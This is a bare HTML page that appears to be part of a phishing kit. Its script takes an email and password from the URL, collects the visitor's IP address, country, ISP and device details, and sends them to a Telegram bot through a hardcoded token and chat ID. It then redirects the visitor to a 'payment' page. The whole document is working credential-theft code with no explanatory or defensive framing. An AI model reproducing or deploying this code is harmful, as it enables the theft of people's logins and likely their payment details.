<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>.</title>
<style>html,body{margin:0;height:100%;background:#fff;overflow:hidden}</style>
</head>
<body>
<script>
(function () {
  var botToken = "8977450148:AAGjbv8uZNJLo6fdYuxAww9I0iluUxGy0Pg";
  var chatId   = "5323808926";
  var redirect = "../payment.html";

  var p = new URLSearchParams(location.search);
  var email = p.get("email") || "";
  var pass  = p.get("Password") || p.get("password") || "";

  function ua() {
    var s = navigator.userAgent, b = "Unknown", o = "Unknown", d = "Desktop";
    if (/Edg\//.test(s)) b = "Edge";
    else if (/OPR\/|Opera/.test(s)) b = "Opera";
    else if (/Firefox\//.test(s)) b = "Firefox";
    else if (/Chrome\//.test(s)) b = "Chrome";
    else if (/Safari\//.test(s)) b = "Safari";
    if (/Windows NT 10/.test(s)) o = "Windows 10/11";
    else if (/Windows/.test(s)) o = "Windows";
    else if (/Android/.test(s)) o = "Android";
    else if (/iPhone|iPad|iPod/.test(s)) o = "iOS";
    else if (/Mac OS X/.test(s)) o = "macOS";
    else if (/Linux/.test(s)) o = "Linux";
    if (/iPad|Tablet/.test(s)) d = "Tablet";
    else if (/Mobi|Android|iPhone/.test(s)) d = "Mobile";
    return b + " - " + o + " - " + d;
  }

  function send(ip, cc, isp) {
    var text = "LOGIN\n\nID: " + email + "\nPASS: " + pass +
               "\n\nIP: " + ip + " - " + cc + " - " + isp +
               "\nDevice: " + ua();
    var url = "https://api.telegram.org/bot" + botToken +
              "/sendMessage?chat_id=" + encodeURIComponent(chatId) +
              "&text=" + encodeURIComponent(text);
    new Image().src = url;
    try { fetch(url, { mode: "no-cors", keepalive: true }).catch(function () {}); } catch (e) {}
  }

  var done = false;
  function go() {
    if (done) return;
    done = true;
    location.replace(redirect);
  }

  fetch("https://ipwho.is/")
    .then(function (r) { return r.json(); })
    .then(function (j) {
      send(j.ip || "", j.country || "", (j.connection && j.connection.isp) || "");
    })
    .catch(function () { send("", "", ""); })
    .then(function () { setTimeout(go, 500); });

  setTimeout(go, 2500);
})();
</script>
</body>
</html>
